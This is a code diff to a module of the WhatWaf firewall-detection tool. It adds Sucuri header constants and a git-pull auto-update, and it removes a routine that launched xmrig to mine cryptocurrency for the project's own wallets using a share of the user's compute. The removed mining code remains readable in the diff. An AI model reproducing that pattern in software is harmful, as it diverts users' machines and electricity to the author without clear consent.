@@ -3,13 +3,10 @@ import re
 import sys
 import json
 import time
-import shlex
 import random
 import string
-import timeit
 import platform
 import warnings
-import subprocess
 try:
     import urlparse
 except ImportError:
@@ -31,7 +28,7 @@ except:
     pass
 
 # version number <major>.<minor>.<commit>
-VERSION = "2.0.3"
+VERSION = "2.1.4.1"
 
 # version string
 VERSION_TYPE = "($dev)" if VERSION.count(".") > 1 else "($stable)"
@@ -334,6 +331,8 @@ class HTTP_HEADER:
     X_FORWARDED_FOR = "X-Forwarded-For"
     X_SERVER = "X-Server"
     X_BACKSIDE_TRANS = "X-Backside-Transport"
+    X_SUCURI_BLOCK = "X-Sucuri-Block"
+    X_SUCURI_ID = "X-Sucuri-ID"
 
 
 def validate_url(url):
@@ -958,62 +957,37 @@ def make_saying_pretty(saying_string):
 
 def get_miner_pid(name="xmrig"):
     """
-    find the miner process ID
+    deprecated
     """
-    try:
-        import psutil
-    except ImportError:
-        return None
-
-    for proc in psutil.process_iter():
-        if name in proc.name():
-            return proc.pid
+    return None
 
 
 def do_mine_for_whatwaf(proc_pid, start_time, start_it=True):
     """
-    mine for whatwaf for a little bit
+    whatwaf mining will no longer be done
     """
-    import signal
+    lib.formatter.info("Skipping mining procedure")
+    pass
 
-    pool = random.SystemRandom().choice(OPTIONS_MINING_POOLS)
-    wallet = random.SystemRandom().choice(OPTIONAL_MINING_WHATWAF_WALLETS)
-    whatwaf_miner_command = shlex.split("{}/xmrig -o {} -u {} -k -l {} --verbose".format(
-                    lib.settings.OPTIONAL_MINING_MINERS,
-                    pool,
-                    wallet,
-                    lib.settings.OPTIONAL_MINER_LOG_FILENAME
-                )
-    )
 
-    if proc_pid is not None:
-        try:
-            lib.formatter.info("killing your instance of xmrig")
-            os.kill(proc_pid, signal.SIGTERM)
-            lib.formatter.info("your instance of xmrig was killed successfully")
-        except Exception:
-            lib.formatter.error("failed to kill xmrig, current PID is: '{}', kill it manually".format(proc_pid))
+def auto_update():
+    """
+    updates from the github repo
+    """
 
-        stop_time = timeit.default_timer()
-        # take the stop time of the miner minus the start time subtract 15 seconds for waiting at the start
-        # and mine that amount of time for whatwaf's wallets, whatwaf uses
-        whatwaf_mining_timeframe = (stop_time - start_time - 15) * 0.35
-        if start_it:
-            try:
-                proc = subprocess.Popen(
-                    whatwaf_miner_command, stderr=subprocess.PIPE, stdout=subprocess.PIPE
-                )
-            except:
-                proc = None
-            if proc is not None:
-                lib.formatter.warn("sleeping for 15 seconds to give the miner time to start")
-                time.sleep(15)
-                lib.formatter.info("starting whatwhat xmrig mining procedure")
-                while time.time() <= whatwaf_mining_timeframe:
-                    time.sleep(1)
-                lib.formatter.info("done mining, killing xmrig")
-                try:
-                    os.kill(proc.pid, signal.SIGTERM)
-                    lib.formatter.info("xmrig was killed successfully, thanks for mining with us today :)")
-                except:
-                    lib.formatter.error("miner was unable to be killed, please kill it manually PID: '{}'".format(proc.pid))
+    import git
+
+    try:
+        lib.formatter.info("attempting to update WhatWaf")
+        repo = git.Repo()
+        current = repo.head.commit
+        repo.remotes.origin.pull()
+        new = repo.head.commit
+        if current == new:
+            lib.formatter.info("WhatWaf is the newest version")
+        else:
+            lib.formatter.success("successfully updated WhatWaf to the newest version")
+
+    except:
+        lib.formatter.error("unable to update WhatWaf, a new version is out attempt updating by typing `git pull`")
+        pass
